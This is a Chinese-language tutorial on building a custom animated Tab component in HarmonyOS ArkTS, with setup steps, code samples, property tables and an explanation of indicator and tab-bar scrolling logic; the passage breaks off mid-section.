#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言：</h3>
<p>本示例介绍使用List、Text等组件，以及animateTo等接口实现自定义Tab效果。</p>
<h3 data-id="heading-1">效果预览图</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0902abaf52b1453ca3b99e5b48e54f7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=ofjnt6Rur%2BoNoc%2FwDkn1%2FjLbotw%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<p>1.选中页签，字体放大加粗且后面有背景条，起到强调作用。</p>
<p>2.手势触摸tab内容滑动，背景条跟随手势一起滑动。抬手时，当tab内容滑动距离不足一半时，会自动回弹，而当tab内容滑动距离大于一半时，背景条则会移动到下一个页签。当背景条滑动到一定距离后开始滑动页签条，使背景条始终能够保持在可视范围内。</p>
<p>3.点击页签，可以进行页签切换。</p>
<p>4.滑动页签条，背景条也会随之一起滑动，然后滑动tab内容，页签条会滑动到原处，使背景条处于可视范围内，之后背景条开始跟随手势滑动。</p>
<p>5.动画承接，背景条滑动过程中，触摸屏幕，背景条动画停止，松开手势，背景条继续滑动</p>
<h3 data-id="heading-2">下载安装</h3>
<p>1.模块oh-package.json5文件中引入依赖</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-string">"dependencies"</span>: {
  <span class="hljs-string">"@ohos-cases/custom_animation_tab"</span>: <span class="hljs-string">"har包地址"</span>
}
</code></pre>
<p>2.ets文件import自定义视图实现Tab效果组件</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {<span class="hljs-title class_">CustomAnimationTab</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos-cases/custom_animation_tab'</span>
</code></pre>
<h3 data-id="heading-3">快速使用</h3>
<p>本节主要介绍了如何快速上手使用自定义视图实现Tab效果组件，包括构建Tab组件以及常见自定义参数的初始化。</p>
<p>1.构建Tab</p>
<p>在代码合适的位置使用CustomAnimationTab组件并传入对应的参数（animationAttribute必须设置，其余参数可以使用默认值），后续将分别介绍对应参数的初始化。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">/**
 * 构建自定义Tab
 * animationAttribute: 动效属性
 * tabsInfo: tab数据源
 * indicatorBarAttribute: 背景条属性
 * tabBarAttribute: 页签条属性
 * tabController: 自定义动效tab控制器
 * scroller: 页签条滚动控制器
 */</span>
CustomAnimationTab({
  animationAttribute: <span class="hljs-keyword">this</span>.animationAttribute,
  tabsInfo: <span class="hljs-keyword">this</span>.tabsInfo,
  indicatorBarAttribute: <span class="hljs-keyword">this</span>.indicatorBarAttribute,
  tabBarAttribute: <span class="hljs-keyword">this</span>.tabBarAttribute,
  tabController: <span class="hljs-keyword">this</span>.tabController,
  scroller: <span class="hljs-keyword">this</span>.scroller
})
</code></pre>
<p>2.动效属性初始化</p>
<p>动效属性基类为AnimationAttribute，其中封装了tab组件内部的动效属性。本示例中提供了开发自定义背景条颜色动效属性的代码。首先创建一个MyAnimationAttribute类，并继承AnimationAttribute基类，其中新增背景条颜色属性indicatorBarColor；之后创建MyAnimationAttribute状态变量对象animationAttribute，并将背景条颜色属性绑定到自定义背景条上，同时与button相关联，通过点击事件动态更改背景条颜色。（这里需要注意class对象属性级更新的正确使用）</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 自定义动效属性，添加了背景条颜色变化</span>
<span class="hljs-meta">@State</span> animationAttribute: <span class="hljs-type">MyAnimationAttribute</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">MyAnimationAttribute</span>($r(<span class="hljs-string">"app.color.custom_animation_tab_indicator_color"</span>));


<span class="hljs-keyword">export</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyAnimationAttribute</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AnimationAttribute</span> </span>{
  <span class="hljs-comment">// 背景条颜色</span>
  indicatorBarColor: <span class="hljs-type">ResourceColor</span>;

  constructor(indicatorBarColor: <span class="hljs-type">ResourceColor</span>) {
    <span class="hljs-keyword">super</span>();
    <span class="hljs-keyword">this</span>.indicatorBarColor = indicatorBarColor;
  }
}


<span class="hljs-meta">@Builder</span>
indicatorBar($$: <span class="hljs-type">BaseInterface</span>) {
  <span class="hljs-type">Column</span>()
    .height($r(<span class="hljs-string">"app.float.custom_animation_tab_indicator_height"</span>))
    .width($r(<span class="hljs-string">"app.string.custom_animation_tab_one_hundred_percent"</span>))
    <span class="hljs-comment">// 绑定自定义动效属性</span>
    .backgroundColor(<span class="hljs-keyword">this</span>.animationAttribute.indicatorBarColor)
    .borderRadius($r(<span class="hljs-string">"app.float.custom_animation_tab_indicator_border_radius"</span>))
}

<span class="hljs-comment">// 更新自定义动效变量——背景条颜色</span>
<span class="hljs-type">Column</span>() {
  <span class="hljs-type">Button</span>($r(<span class="hljs-string">"app.string.custom_animation_tab_button_text"</span>))
    .height($r(<span class="hljs-string">"app.string.custom_animation_tab_ninety_percent"</span>))
    .<span class="hljs-keyword">type</span>(<span class="hljs-type">ButtonType</span>.<span class="hljs-type">Capsule</span>)
    .onClick(() =&gt; {
      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.animationAttribute.indicatorBarColor as <span class="hljs-type">Resource</span>).id ===
      $r(<span class="hljs-string">"app.color.custom_animation_tab_indicator_color"</span>).id) {
        <span class="hljs-keyword">this</span>.animationAttribute.indicatorBarColor = <span class="hljs-type">Color</span>.<span class="hljs-type">Yellow</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.animationAttribute.indicatorBarColor === <span class="hljs-type">Color</span>.<span class="hljs-type">Yellow</span>) {
        <span class="hljs-keyword">this</span>.animationAttribute.indicatorBarColor = $r(<span class="hljs-string">"app.color.custom_animation_tab_indicator_color"</span>);
      }
    })
}
.justifyContent(<span class="hljs-type">FlexAlign</span>.<span class="hljs-type">Center</span>)
.height($r(<span class="hljs-string">"app.string.custom_animation_tab_ten_percent"</span>))
.width($r(<span class="hljs-string">"app.string.custom_animation_tab_one_hundred_percent"</span>))
</code></pre>
<p>3.数据初始化</p>
<p>本小节主要介绍了如何初始化自定义Tab数据源。首先构建一个TabInfo数组，然后向其中传入对应的TabInfo对象，TabInfo对象主要需要传入三个属性——页签标题、tab页面内容视图以及页签组件。以base页面为例，首先创建一个@Builder函数，在该函数中填入struct组件，在struct组件中编写对应tab页面内容视图。然后，构建对应的页签样式tabBar，其中需要添加一个TabBarItemInterface类对象作为形参，其包括了一些必要属性，可以自定义样式修改，本示例中主要通过使用当前索引curIndex与页签索引index之间的比较来动态更改页签样式。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// tab数据</span>
<span class="hljs-attr">tabsInfo</span>: <span class="hljs-title class_">TabInfo</span>[] = [];

<span class="hljs-variable language_">this</span>.<span class="hljs-property">tabsInfo</span> = [
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_BASE_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(baseBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar)),
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_UI_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(uiBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar)),
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_DYEFFECT_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(dyEffectBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar)),
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_THIRTYPARTY_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(thirdPartyBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar)),
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_NATIVE_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(nativeBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar)),
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TabInfo</span>(<span class="hljs-title class_">CustomAnimationTabConfigure</span>.<span class="hljs-property">DEFAULT_OTHER_TAB</span>, <span class="hljs-title function_">wrapBuilder</span>(otherBuilder), <span class="hljs-title function_">wrapBuilder</span>(tabBar))
]
  
<span class="hljs-comment">// baseBuilder页面</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LazyDataSource</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./LazyDataSource'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SkeletonLayout</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./SkeletonLayout'</span>;

<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">baseBuilder</span>(<span class="hljs-params"/>) {
  <span class="hljs-title class_">BasePage</span>();
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">BasePage</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">LazyDataSource</span>&lt;<span class="hljs-built_in">string</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyDataSource</span>&lt;<span class="hljs-built_in">string</span>&gt;();

  <span class="hljs-title function_">aboutToAppear</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>.<span class="hljs-title function_">pushData</span>(<span class="hljs-string">`<span class="hljs-subst">${i}</span>`</span>);
    }
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">List</span>() {
        <span class="hljs-title class_">LazyForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-title class_">SkeletonLayout</span>({<span class="hljs-attr">isMine</span>: <span class="hljs-literal">false</span>})
          }
        })
      }
      .<span class="hljs-title function_">cachedCount</span>(<span class="hljs-number">1</span>)
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">"100%"</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">"100%"</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">"100%"</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">"100%"</span>)
  }
}

<span class="hljs-comment">// 页签样式</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">tabBar</span>(<span class="hljs-params">$$: TabBarItemInterface</span>) {
  <span class="hljs-title class_">Text</span>($$.<span class="hljs-property">title</span>)
    .<span class="hljs-title function_">fontSize</span>($$.<span class="hljs-property">curIndex</span> === $$.<span class="hljs-property">index</span> ? $r(<span class="hljs-string">"app.float.custom_animation_tab_list_select_font_size"</span>) : $r(<span class="hljs-string">"app.float.custom_animation_tab_list_unselect_font_size"</span>))
    .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">"app.color.custom_animation_tab_list_font_color"</span>))
    .<span class="hljs-title function_">fontWeight</span>($$.<span class="hljs-property">curIndex</span> === $$.<span class="hljs-property">index</span> ? <span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span> : <span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Medium</span>)
    .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
}
</code></pre>
<p>4.背景条初始化</p>
<p>背景条可以通过IndicatorBarAttribute类进行配置，也可以使用已有的背景条配置（目前支持两种: IndicatorBarAttribute.BACKGROUNDBAR和IndicatorBarAttribute.THINSTRIP）。本示例主要介绍了构建IndicatorBarAttribute类进行背景条配置，其中传入了背景条组件indicatorBar ，背景条宽度模式设置为内边距模式，左右边距设为20，上下边距设为10，同时设置背景条最大偏移为CustomAnimationTabConfigure.INDICATOR_MAX_LEFT以及背景条宽度扩展比例为CustomAnimationTabConfigure.DEFAULT_INDICATOR_EXPAND。</p>
<pre><code class="hljs language-less" lang="less">indicatorBarAttribute: IndicatorBarAttribute = new IndicatorBarAttribute(this.indicatorBar, SizeMode.<span class="hljs-attribute">Padding, 20, 10,
  CustomAnimationTabConfigure.INDICATOR_MAX_LEFT, CustomAnimationTabConfigure.DEFAULT_INDICATOR_EXPAND);

@Builder
indicatorBar($$</span>: BaseInterface) {
  <span class="hljs-built_in">Column</span>()
    .<span class="hljs-built_in">height</span>($<span class="hljs-built_in">r</span>(<span class="hljs-string">"app.string.custom_animation_tab_one_hundred_percent"</span>))
    .<span class="hljs-built_in">width</span>($<span class="hljs-built_in">r</span>(<span class="hljs-string">"app.string.custom_animation_tab_one_hundred_percent"</span>))
    .<span class="hljs-built_in">backgroundColor</span>(this.animationAttribute.indicatorBarColor)
    .<span class="hljs-built_in">borderRadius</span>($<span class="hljs-built_in">r</span>(<span class="hljs-string">"app.float.custom_animation_tab_indicator_border_radius"</span>))
}
</code></pre>
<p>5.页签条初始化</p>
<p>页签条属性通过TabBarAttribute类进行配置。本例中主要配置了各个页签的宽度大小以及页签条高度。</p>
<pre><code class="hljs language-ini" lang="ini">tabBarAttribute: <span class="hljs-attr">TabBarAttribute</span> = new TabBarAttribute(CustomAnimationTabConfigure.LIST_ITEM_WIDTH, CustomAnimationTabConfigure.TABBAR_HEIGHT)
</code></pre>
<p>6.tab及页签条控制器初始化</p>
<p>自定义Tab控制器以及页签条控制器分别通过CustomAnimationTabController和Scroller初始化，分别用于控制自定义Tab与页签条的行为。</p>
<pre><code class="hljs language-ini" lang="ini">// tabController
tabController: <span class="hljs-attr">CustomAnimationTabController</span> = new CustomAnimationTabController()<span class="hljs-comment">;</span>
// scroller
scroller: <span class="hljs-attr">Scroller</span> = new Scroller()<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-4">属性(接口)说明</h3>
<p>CustomAnimationTab组件属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>animationAttribute</p>
<p>AnimationAttribute</p>
<p>封装了包括背景条长度、背景条高度以及背景条左边距在内的动效属性，使组件内部对应的属性可以动态变化</p>
<p>undefined</p>
<p>tabsInfo</p>
<p>TabInfo[]</p>
<p>tab数据源</p>
<p>-</p>
<p>indicatorBarAttribute</p>
<p>IndicatorBarAttribute</p>
<p>背景条属性类，配置背景条组件，以及背景条相关的属性</p>
<p>-</p>
<p>tabBarAttribute</p>
<p>AnimationAttribute</p>
<p>页签条属性类，配置页签条相关的属性</p>
<p>-</p>
<p>tabController</p>
<p>CustomAnimationController</p>
<p>tab控制器，用于控制tabs组件进行页签切换</p>
<p>-</p>
<p>scroller</p>
<p>Scroller</p>
<p>页签条控制器，可以控制页签条的滚动</p>
<p>-</p>
<p>animationDuration</p>
<p>number</p>
<p>页签切换时长，控制页签切换时背景条滑动以及tab页面之间切换的时长</p>
<p>240ms</p>
<p>startIndex</p>
<p>number</p>
<p>配置起始的页签索引</p>
<p>0</p>
<p>gestureAnimation</p>
<p>(index: number, targetIndex: number, elementsInfo: [number, number][], ratio: number) =&gt; void</p>
<p>配置在tab页面上手势滑动时背景条的跟手动效</p>
<p>-</p>
<p>autoAnimation</p>
<p>(index: number, targetIndex: number, elementsInfo: [number, number][], ratio: number) =&gt; void</p>
<p>配置在tab页面上离手后背景条的自动滑动动效</p>
<p>-</p>
<p>clickAnimation</p>
<p>(index: number, targetIndex: number, indexInfo: Record&lt;string, number&gt;, targetIndexInfo: Record&lt;string, number&gt;, elementsInfo: [number, number][]) =&gt; void</p>
<p>配置点击页签时背景条的滑动动效</p>
<p>-</p>
<p>getScrollInfo</p>
<p>(center: number, width: number) =&gt; [number, number]</p>
<p>获取页签对应的背景条左边距以及页签条偏移，通过该函数可以自行配置选中各个页签时背景条的左边距以及页签条的偏移情况</p>
<p>-</p>
<p>TabInfo类属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>title</p>
<p>string</p>
<p>页签标题</p>
<p>-</p>
<p>contentbuilder</p>
<p>WrappedBuilder&lt;[]&gt;</p>
<p>tab页面内容视图</p>
<p>-</p>
<p>barBuilder</p>
<p>WrappedBuilder&lt;[TabBarItemInterface]&gt;</p>
<p>页签组件（没有配置，则使用内部默认配置）</p>
<p>undefined</p>
<p>IndicatorBarAttribute类属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>indicatorBar</p>
<p>(index: BaseInterface) =&gt; void</p>
<p>自定义背景条组件</p>
<p>-</p>
<p>sizeMode</p>
<p>SizeMode</p>
<p>背景条宽度模式</p>
<p>SizeMode.Normal</p>
<p>innerWidth</p>
<p>number</p>
<p>1. 尺寸模式为正常模式，表示背景条宽度，值为0时则与页签宽度保持一致;<br/>
2. 尺寸模式为内边距模式，表示背景条与页签项之间的左右边距</p>
<p>0</p>
<p>innerHeight</p>
<p>number</p>
<p>1. 尺寸模式为正常模式，表示背景条高度，值为0时则与页签高度保持一致;<br/>
2. 尺寸模式为内边距模式，表示背景条与页签项之间的上下边距</p>
<p>0</p>
<p>maxIndicatorBarLeft</p>
<p>number</p>
<p>背景条最大偏移(&lt;0: 无上限, &gt;=0: innerMaxIndicatorBarLeft)，配置背景条最大的滑动距离，超过该距离后除非页签条滑动到了底部，否则滑动页签条，背景条不再滑动</p>
<p>-1</p>
<p>indicatorExpand</p>
<p>number</p>
<p>背景条宽度扩展比例，配置背景条在滑动过程中宽度扩展的比例</p>
<p>1</p>
<p>barAlign</p>
<p>VerticalAlign</p>
<p>背景条垂直布局，配置背景条相对于页签的位置</p>
<p>VerticalAlign.Center</p>
<p>TabBarAttribute类属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>barItemWidth</p>
<p>Length</p>
<p>各个页签项的宽度（没有设置且尺寸模式为正常模式时，与页签同宽；没有设置且尺寸模式为内边距模式时，与背景条同宽）</p>
<p>undefined</p>
<p>barHeight</p>
<p>Length</p>
<p>页签条高度（没有设置且尺寸模式为正常模式时，与首个页签同高；没有设置且尺寸模式为内边距模式时，与背景条同高）</p>
<p>undefined</p>
<p>scrollable</p>
<p>boolean</p>
<p>是否可以滚动页签条(false则所有页签等分屏幕宽度，barItemWidth失效)</p>
<p>true</p>
<p>barEdgeEffect</p>
<p>EdgeEffect</p>
<p>页签条边缘滑动效果，支持弹簧效果和阴影效果</p>
<p>EdgeEffect.Spring</p>
<p>barVertical</p>
<p>BarPosition</p>
<p>页签条位置，处于tab内容的上方或下方</p>
<p>BarPosition.Start</p>
<p>barBackgroundColor</p>
<p>ResourceColor</p>
<p>页签条背景颜色</p>
<p>Color.Transparent</p>
<p>BaseInterface属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>curIndex</p>
<p>number</p>
<p>当前选中的页签索引</p>
<p>-</p>
<p>TabBarItemInterface属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>curIndex</p>
<p>number</p>
<p>当前选中的页签索引</p>
<p>-</p>
<p>index</p>
<p>number</p>
<p>页签本身索引</p>
<p>-</p>
<p>title</p>
<p>string</p>
<p>页签标题</p>
<p>-</p>
<p>SizeMode属性</p>
<p>属性</p>
<p>类型</p>
<p>释义</p>
<p>默认值</p>
<p>Normal</p>
<p>-</p>
<p>标准宽度模式，背景条尺寸通过背景条宽高属性显示设置</p>
<p>-</p>
<p>Padding</p>
<p>-</p>
<p>内边距模式，背景条尺寸通过页签上下边距隐性设置</p>
<p>-</p>
<h3 data-id="heading-5">实现思路</h3>
<p>本案例的功能实现主要可以分为两个部分：第一个是点击页签的切换，第二个是滑动tab的切换。在后续两小节将对以上两个部分进行详细介绍。然后，我们展示了一些重要的变量名及其含义。</p>
<ul>
<li>maxListOffset：页签条最大偏移距离</li>
<li>maxIndicatorBarLeft： 背景条最大偏移距离</li>
<li>AnimationAttribute.left：背景条位置</li>
</ul>
<h4 data-id="heading-6">1.核心函数getScrollInfo</h4>
<p>由于我们将页签动画效果分为两种不同类型的滑动，因此需要实现一个函数以分别获取每个页签对应的背景条位置以及页签条滑动偏移。</p>
<p>1.1 背景条最大滑动距离以及页签条最大滑动距离</p>
<p>首先，我们需要了解两个概念：背景条最大滑动距离以及页签条最大滑动距离，如下图所示。</p>
<p>（1）背景条最大偏移距离：背景条滑动到该处时不再向后滑动，此时页签条接管滑动。</p>
<p>（2）页签条最大偏移距离：当页签条接管滑动以后，当滑动到末尾时，无法向后滑动，此时背景条再次接管滑动。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15c9b31735ad41a8a2542cbcbf2e1f18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623716&amp;x-signature=2jvHdEkc8264CFo3tqidfzG49Us%3D" alt="" loading="lazy"/></p>
<p>1.2 三个阶段</p>
<p>从上面的两个概念，我们可以看出滑动主要可以切分为三个阶段：1）背景条初始滑动阶段；2）页签条滑动阶段；3）背景条再次滑动阶段。</p>
<p>1.3 代码实现</p>
<p>通过以上两个小节的介绍，我们可以尝试实现代码。具体代码如下所示：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 获取页签对应的背景条位置以及页签条偏移
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">center</span> - 页签中心点
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">width</span> - 页签条宽度
 * <span class="hljs-doctag">@returns</span>: [背景条左端位置, 页签条偏移]
 */</span>
<span class="hljs-meta">@Param</span> <span class="hljs-attr">getScrollInfo</span>: <span class="hljs-function">(<span class="hljs-params">center: <span class="hljs-built_in">number</span>, width: <span class="hljs-built_in">number</span></span>) =&gt;</span> [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>] =
  (<span class="hljs-attr">center</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>): [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>] =&gt; {
    <span class="hljs-comment">// 获取背景条位置</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">indicatorLeft</span>: <span class="hljs-built_in">number</span> = center - <span class="hljs-variable language_">this</span>.<span class="hljs-property">indicatorBarWith</span> / <span class="hljs-number">2</span>;
    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点: 当背景条位置大于默认的背景条最大位置时，选取背景条最大位置作为背景条实际位置</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">finalIndicatorLeft</span>: <span class="hljs-built_in">number</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxIndicatorBarLeft</span> &gt;= <span class="hljs-number">0</span> ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(indicatorLeft, <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxIndicatorBarLeft</span>) : indicatorLeft;
    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点: 背景条产生的多余距离作为页签条滑动距离</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">listOffset</span>: <span class="hljs-built_in">number</span> = indicatorLeft - finalIndicatorLeft;
    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点: 当页签条偏移大于页签条可偏移量，选取页签条可偏移量作为页签条实际偏移</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">finalListOffset</span>: <span class="hljs-built_in">number</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(listOffset, <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxListOffset</span>);
    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 知识点: 页签条多余的偏移作为背景条后续的滑动距离</span>
    finalIndicatorLeft += listOffset - finalListOffset;
    <span class="hljs-keyword">return</span> [finalIndicatorLeft, finalListOffset];
  };
</code></pre>
<p>具体思路：首先我们可以根据页签的位置信息获取对应背景条的初始位置。1）第一阶段：背景条初始位置就是背景条的实际位置；2）第二阶段：当背景条偏移大于背景条最大偏移距离时，进入第二阶段。这时候后续多余的背景条偏移需要作为页签条偏移，以实现页签条移动；3）第三阶段：当页签条偏移大于页签条最大偏移量时，进入第三阶段。此时多余的页签条偏移会作为背景条的偏移，使背景条继续向后滑动。</p>
<h4 data-id="heading-7">2.点击页签的切换</h4>
<ul>
<li>
<p>首先在onChange回调中实现对应的动画效果，当事件为点击事件并且需要进行页签切换时才进入到对应的动画效果实现，其中首先通过获取index页签的中心位置计算背景条位置，以实现背景条移动到当前页签位置。然后，通过elementsInfo数组获取index页签对应的页签条偏移，从而对页签条进行滑动。而背景条的滑动则通过页签条的滑动回调函数onDidScroll来进行。</p>
<p>// tab
Swiper(this.swiperController) {
// 布局实现
}
.onChange((index: number) =&gt; {
// 点击事件且发生页签切换
if (this.listTouchState === 1 &amp;&amp; index !== this.curIndex) {
let indexInfo: Record&lt;string, number&gt; = this.getElementInfo(this.curIndex);
let targetIndexInfo: Record&lt;string, number&gt; = this.getElementInfo(index);
this.clickAnimation(this.curIndex, index, indexInfo, targetIndexInfo, this.elementsInfo);
}
this.curIndex = index;
console.log(<code>curIndex: ${this.curIndex}</code>)
})</p>
<p>clickAnimation: (targetIndex: number, targetIndexInfo: Record&lt;string, number&gt;, elementsInfo: IndicatorAnimationInfo[]) =&gt; void =
(targetIndex: number, targetIndexInfo: Record&lt;string, number&gt;, elementsInfo: IndicatorAnimationInfo[]): void =&gt; {
// 根据targetIndex页签当前位置获取对应的背景条位置
this.animationAttribute.left = targetIndexInfo.center - this.elementsInfo[targetIndex].width / 2;
this.animationAttribute.indicatorBarWidth = this.elementsInfo[targetIndex].width;
this.animationAttribute.indicatorBarHeight = this.elementsInfo[targetIndex].height;
this.scroller!.scrollTo({xOffset: elementsInfo[targetIndex].offset, yOffset: 0, animation: {duration: this.animationDuration, curve: Curve.Linear}});
};</p>
</li>
<li>
